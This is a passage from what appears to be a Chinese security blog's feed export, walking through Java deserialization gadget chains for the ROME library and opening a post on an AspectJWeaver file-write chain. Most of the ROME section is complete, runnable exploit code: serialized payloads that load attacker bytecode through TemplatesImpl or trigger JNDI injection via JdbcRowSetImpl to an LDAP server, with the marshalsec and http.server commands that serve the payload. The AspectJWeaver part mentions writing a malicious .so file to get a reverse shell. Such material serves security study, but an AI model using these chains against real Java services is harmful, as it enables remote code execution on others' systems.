调用ToStringBean的toString方法</span><br>&#125;<br></code></pre></td></tr></table></figure><p>接着要找某个类的<code>readObject</code>调用了<code>toString</code>且调用者可控。</p><p>这里找了个中间人<code>EqualsBean</code>，和<code>ToStringBean</code>在同一个包下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EqualsBean</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-comment">// The hashcode is calculated by getting the hashcode of the Bean String representation</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EqualsBean</span><span class="hljs-params">(Class beanClass,Object obj)</span> &#123;<br>        <span class="hljs-keyword">if</span> (!beanClass.isInstance(obj)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(obj.getClass()+<span class="hljs-string">&quot; is not instance of &quot;</span> + beanClass);<br>        &#125;<br>        _beanClass = beanClass;<br>        _obj = obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> beanHashCode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">beanHashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> _obj.toString().hashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>熟悉的<code>hashCode</code>，入口就是<code>URLDNS</code>的入口类<code>hashMap</code></p><p><code>hashMap#readObject</code> &#x3D;&gt; <code>hash(key)</code> &#x3D;&gt; <code>key.hashCode()</code> &#x3D;&gt; <code>EqualsBean#hashCode</code></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>和<code>URLDNS</code>一样，往<code>map</code>里<code>put</code>时会触发<code>hashCode</code>，这里使用<code>ObjectBean</code>来作中转，后面再用反射修改:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectBean</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ObjectBean</span><span class="hljs-params">(Class beanClass,Object obj,Set ignoreProperties)</span> &#123;<br>        _equalsBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(beanClass,obj);<br>        _toStringBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(beanClass,obj);<br>        _cloneableBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CloneableBean</span>(obj,ignoreProperties);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> _equalsBean.beanHashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, obj);<br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class, bean);<br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">fakeBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(String.class, <span class="hljs-string">&quot;p4d0rn&quot;</span>);  <span class="hljs-comment">// 传入无害的String.class</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(fakeBean, <span class="hljs-number">1</span>);  <span class="hljs-comment">// 注意put的时候也会执行hash</span><br>        setFieldValue(fakeBean, <span class="hljs-string">&quot;_equalsBean&quot;</span>, equalsBean);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(map);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这里还有一个问题。</p><p>构造<code>ToStringBean</code>时应该传入<code>Templates.class</code>，这个<code>Templates</code>接口只定义了<code>getOutputProperties</code>这个方法。</p><p>若传入<code>TemplatesImpl.class</code>，<code>BeanIntrospector.getPropertyDescriptors(Target.class)</code>遍历getter方法时，会先遍历到<code>getStylesheetDOM</code>，<code>return (DOM)_sdom.get();</code>。</p><p>而<code>_sdom</code>这个属性被<code>transient</code>修饰，无法被序列化。反序列化的时候会抛出<code>NullPoint</code>异常，退出<code>getter</code>方法遍历，导致无法执行到<code>getOutputProperties</code></p></blockquote><p>CC5中也有利用到<code>toString()</code>的类，<code>BadAttributeValueExpException</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BadAttributeValueExpException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Exception</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BadAttributeValueExpException</span> <span class="hljs-params">(Object val)</span> &#123;<br>        <span class="hljs-built_in">this</span>.val = val == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : val.toString();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">gf</span> <span class="hljs-operator">=</span> ois.readFields();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">valObj</span> <span class="hljs-operator">=</span> gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-keyword">if</span> (valObj == <span class="hljs-literal">null</span>) &#123;<br>            val = <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>            val= valObj;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span><br>                || valObj <span class="hljs-keyword">instanceof</span> Long<br>                || valObj <span class="hljs-keyword">instanceof</span> Integer<br>                || valObj <span class="hljs-keyword">instanceof</span> Float<br>                || valObj <span class="hljs-keyword">instanceof</span> Double<br>                || valObj <span class="hljs-keyword">instanceof</span> Byte<br>                || valObj <span class="hljs-keyword">instanceof</span> Short<br>                || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;<br>            val = valObj.toString();<br>        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>            val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/10/Rome/image-20240810223842547.png" alt="image-20240810223842547"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, obj);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(bean);<br>        <br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(badAttributeValueExpException);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>fastjson那节利用的是<code>JdbcRowSetImpl#setAutoCommit</code>来进行jndi注入，但ROME链是触发getter方法。</p><p>实际上在<code>JdbcRowSetImpl</code>类里搜索<code>this.connect()</code>，还存在一个方法<code>getDatabaseMetaData</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> DatabaseMetaData <span class="hljs-title function_">getDatabaseMetaData</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.connect();<br>    <span class="hljs-keyword">return</span> var1.getMetaData();<br>&#125;<br><span class="hljs-keyword">private</span> Connection <span class="hljs-title function_">connect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.conn != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.conn;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.getDataSourceName() != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">InitialContext</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>                <span class="hljs-type">DataSource</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> (DataSource)var1.lookup(<span class="hljs-built_in">this</span>.getDataSourceName());<br>            &#125;<br>            <span class="hljs-comment">// ....</span><br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>getDataSourceName</code>是在<code>JdbcRowSetImpl</code>父类<code>BaseRowSet</code>中定义的，我们就不能用<code>getDeclaredField</code>来获取了。</p><p><code>JdbcRowSetImpl#setDataSourceName</code>可以直接设置值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        jdbcRowSet.setDataSourceName(<span class="hljs-string">&quot;ldap://127.0.0.1:8099/aaa&quot;</span>);<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(JdbcRowSetImpl.class, jdbcRowSet);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        setFieldValue(badAttributeValueExpException, <span class="hljs-string">&quot;val&quot;</span>, bean);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(badAttributeValueExpException);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>java -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#calc 8099</code>开ldap，</p><p><code>python -m http.server 8000</code>开启web服务，然后就和之前讲的JNDI一样了。</p><p>Rome还有很多变化链，也非常值得思考，可以看下方链接继续跟进学习。</p><p>参考：</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/rome#id-0x02-first-glance">Rome | Java (gitbook.io)</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/136576748?ops_request_misc=%7B%22request_id%22:%22172330093116800211577942%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172330093116800211577942&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-136576748-null-null.nonecase&utm_term=ROME">【Web】浅聊Java反序列化之Rome——EqualsBean&amp;ObjectBean_java反序列化rome链-CSDN博客</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/136589322?ops_request_misc=%7B%22request_id%22:%22172330093116800211577942%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172330093116800211577942&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-136589322-null-null.nonecase&utm_term=ROME">【Web】浅聊Java反序列化之Rome——关于其他利用链_java反序列化rome链-CSDN博客</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AspectJWeaver</title>
    <link href="/2024/08/09/AspectJWeaver/"/>
    <url>/2024/08/09/AspectJWeaver/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>依稀记得国赛初赛的那道Java题目就是用<code>AspectJWeaver</code>写入恶意so文件传进去，然后load_extension一手反弹shell。</p><p>其实用到的就是<code>AspectJWeaver</code>的任意文件写入漏洞。</p><p><code>AspectJWeaver</code>运用在面向切面编程(AOP: Aspect Oriented Programming)中</p><p>AOP是一种编程范式，旨在提高模块化、降低代码耦合度。它可以向现有代码添加其他行为而不修改代码本身。Spring就运用到了AOP</p><p>AOP的一些概念：</p><ul><li>切面(Aspect): 公共功能的实现。如日志切面、权限切面、验签切面。给Java类使用<code>@Aspect</code>注释修饰，就能被AOP容器识别为切面</li><li>通知(Advice): 切面的具体实现，即切面类中的一个方法，根据放置的地方不同，可分为前置通知（Before）、后置通知（AfterReturning）、异常通知（AfterThrowing）、最终通知（After）与环绕通知（Around）</li><li>连接点(JoinPoint): 程序在运行过程中能够插入切面的地方。Spring只支持方法级的连接点。比如一个目标对象有5个方法，就有5个连接点</li><li>切入点(PointCut): 用于定义通知应该切入到哪些连接点</li><li>目标对象(Target): 即将切入切面的对象，被通知的对象</li><li>代理对象(Proxy): 将通知应用到目标对象之后被动态创建的对象，可以简单地理解为，代理对象的功能等于目标对象本身业务逻辑加上共有功能。代理对象对于使用者而言是透明的，是程序运行过程中的产物。目标对象被织入公共功能后产生的对象。</li><li>织入(Weaving): 将切面应用到目标对象从而创建一个新的代理对象的过程。这个过程可以发生在编译时、类加载时、运行时。Spring是在运行时完成织入，运行时织入通过Java语言的反射机制与动态代理机制来动态实现。</li></ul><p>大概了解一下，跟下面讲的利用链没啥关系</p><h2 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h2><p>这个利用链用到了CC依赖。回忆一下，Commons Collections 3.2.2中 增加了⼀个⽅法<code>FunctorUtils#checkUnsafeSerialization</code> ⽤于检测反序列化是否安全，其会检查常见的危险Transformer类，当我们反序列化包含这些对象时就会抛出异常。</p><p><code>AspectJWeaver</code>这里只用到了CC里的<code>LazyMap</code>、<code>TiedMapEntry</code>、<code>ConstantTransformer</code>，高版本CC仍具有实用性。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span 